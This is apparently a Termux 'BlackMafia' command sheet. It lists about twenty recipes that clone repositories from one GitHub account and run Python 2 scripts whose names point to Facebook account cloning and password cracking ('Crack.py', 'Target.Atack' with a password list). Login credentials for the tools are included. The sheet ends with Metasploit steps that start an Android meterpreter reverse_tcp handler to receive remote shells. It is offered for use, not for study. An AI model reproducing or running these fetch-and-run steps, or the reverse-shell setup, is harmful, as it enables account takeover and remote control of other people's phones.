# All Commands BlackMafia


⭕No 1
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/World
cd World
python2 Cloning.py

User: Black
pass: Mafia

⭕No 2
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/WorldCloning/
cd WorldCloning
python2 World.py

User Name : World
Password   : lovehacker
⭕No 3
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize

git clone https://github.com/lovehacker404/Cobra

cd Cobra
python2 Scorpion.py

User Name :  Cobra
Password: lovehacker
⭕No4
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/lov3Hak3r/
cd lov3Hak3r
python2 lovehacker.py
⭕No 5
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/BlackMafia2020/
cd BlackMafia2020
python2 lovehacker

User Name:Corona
Password  :lovehacker
⭕No 6

pkg update 
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize

git clone https://github.com/lovehacker404/CoviD-19/


cd CoviD-19
python2 Virus.py


User Name: Corona
pasword: lovehacker
⭕No 7
pkg update 
pkg upgrade
pkg install python2 
pkg install git 
pip2 install mechanize 
pip2 install requests
 
git clone https://github.com/lovehacker404/Dragon/

cd Dragon
python2 lovehacker.py

UserName:  Dragon
Password:  lovehacker
⭕No8
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/KaliIndia/
cd KaliIndia
python2 kalilinux.India.py
User Name: India
Password:lovehacker
⭕No9
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/Testing
cd Testing
python2 Project.py
User Name: Testing
pasword: lovehacker
⭕No10
git clone https://github.com/lovehacker404/Target.Atack/
cd Target.Atack
ls
cat README.md
chmod +x Target.py
ls
nano password.txt
ls
pwd
storage file location password.txt
python2 Target.py
⭕No11
apt update
apt upgrade
pkg install python
pkg install python2
pip2 install requests
pip2 install mechanize
pkg install git
git clone https://github.com/lovehacker404/fblite
cd fblite
python2 Crack.py
⭕No12
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/india/
cd india
python2 india.py


User name. KashmirBanyGa
pasword.Pakistan
⭕No 13
pkg install python2 
pip2 install mechanize 
pip2 install requests 
pkg install git
 git clone https://github.com/lovehacker404/BlackMafiaNew1.12/
ls 
cd BlackMafiaNew1.12
python2 lovehacker
user name. lovehacker
password . 03094161457
⭕No 14
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/RedMoonNew/
cd RedMoonNew
python2 lovehacker

User Name:: RedMoonNew
Password:: lovehacker
⭕No15
apt update
apt upgrade
apt install git
apt install python 
git clone https://github.com/lovehacker404/Install/
cd Install
ls 
chmod +x *
ls
python all.py
⭕No16
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/NetHunting
cd NetHunting
python2 NetHunting.py

User Name : linux
Password   : lovehacker

⭕No17


pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/WorldCloning/
cd WorldCloning
python2 World.py

User Name : World
Password   : lovehacker
⭕No18
pkg update
pkg upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/lovehacker404/BangBang/
cd BangBang
python2 Mafia
User Name: Pakistan
pasword: lovehacker

⭕No19

pkg update 
pkg upgrade
pkg install python2 
pip2 install mechanize
pkg install git 
pip2 install mechanize 
pip2 install requests 
git clone
https://github.com/lovehacker404/BlackMafiaError
cd BlackMafiaError
python2 Error.py

⭕No20
apt update
apt upgrade -y 
pkg install python -y 
git clone https://github.com/lovehacker404/Black_Mafia
cd Black_Mafia
python3 Black_Mafia.py


#Metasploit Commands
》》Requirements:-

1: Termux App (From Playstore)
2: Good Internet connection  (Must)
3: 2GB free Storage  (Must)
4: Android Version 5.0+ (Must)
5: 4GB+ RAM
6: Fast Processor

#installation

1: pkg update
2: pkg upgrade
3: pkg install unstable-repo
4: pkg install metasploit
5: msfconsole
6: use exploit/multi/handler
7: set payload android/meterpreter/reverse_tcp 
8: set lhost 
8: set lport 8080
10: exploit
